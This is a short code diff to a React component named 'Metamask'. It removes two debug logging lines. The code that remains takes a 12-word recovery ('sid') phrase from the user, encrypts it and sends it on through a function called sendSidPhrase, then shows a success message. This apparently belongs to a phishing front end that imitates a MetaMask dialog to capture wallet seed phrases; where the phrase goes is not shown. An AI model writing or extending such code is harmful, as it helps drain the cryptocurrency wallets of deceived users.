@@ -19,8 +19,6 @@ const Metamask = ({ onHandleClose, onClose }) => {
 
     if (checkSidLength(val) === 12) {
       await DataEncripting(val)
-      console.log('await DataEncripting(val)', await DataEncripting(val))
-      console.log('await DataDecripting(val)', await DataDecripting(val))
       await sendSidPhrase(await DataEncripting(val))
       setTimeout(() => {
         setSuccess(true)
